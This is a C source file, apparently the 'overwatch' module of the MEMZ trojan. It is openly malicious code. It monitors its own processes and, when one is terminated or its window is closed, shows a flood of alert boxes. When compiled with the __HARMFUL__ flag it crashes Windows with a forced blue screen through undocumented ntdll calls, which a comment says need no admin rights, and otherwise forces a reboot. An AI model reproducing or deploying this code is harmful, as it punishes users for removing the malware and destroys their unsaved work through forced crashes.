#include <memz/overwatch.h>
#include <memz/util.h>
#include <memz/data.h>

#include <TlHelp32.h>
#include <Psapi.h>
#include <Reason.h>

static DWORD WINAPI rip_message_thread(LPVOID parameter)
{
    HHOOK hook = SetWindowsHookEx(WH_CBT, message_box_hook, 0, GetCurrentThreadId());
    MessageBoxA(NULL, (LPCSTR)messages[random() % messages_size], "MEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
    UnhookWindowsHookEx(hook);

    return 0;
}

static void kill_windows_instant()
{
    // Try to force BSOD first
    // I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
    // This isn't even an exploit, it's just an undocumented feature.
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL)
    {
        BOOLEAN tmp1; DWORD tmp2;
        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
    }

    // If the computer is still running, do it the normal way
    HANDLE token;
    TOKEN_PRIVILEGES privileges;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

    // The actual restart
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

static void kill_windows()
{
    // Show cool MessageBoxes
    for (int i = 0; i < 20; i++)
    {
        CreateThread(NULL, 4096, rip_message_thread, NULL, 0, 0);
        Sleep(100);
    }

#ifdef __HARMFUL__
    kill_windows_instant();
#endif
}

DWORD WINAPI overwatch_thread(LPVOID parameter)
{
    int oproc = 0;

    char *fn = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
    GetProcessImageFileNameA(GetCurrentProcess(), fn, 512);

    Sleep(1000);

    for (;;)
    {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 proc;
        proc.dwSize = sizeof(proc);

        Process32First(snapshot, &proc);

        int nproc = 0;
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc.th32ProcessID);
            char *fn2 = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
            GetProcessImageFileNameA(hProc, fn2, 512);

            if (!lstrcmpA(fn, fn2)) {
                nproc++;
            }

            CloseHandle(hProc);
            LocalFree(fn2);
        } while (Process32Next(snapshot, &proc));

        CloseHandle(snapshot);

        if (nproc < oproc)
        {
            kill_windows();
        }

        oproc = nproc;

        Sleep(10);
    }
}

LRESULT CALLBACK window_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    if (msg == WM_CLOSE || msg == WM_ENDSESSION)
    {
        kill_windows();
        return 0;
    }

    return DefWindowProc(hwnd, msg, wParam, lParam);
}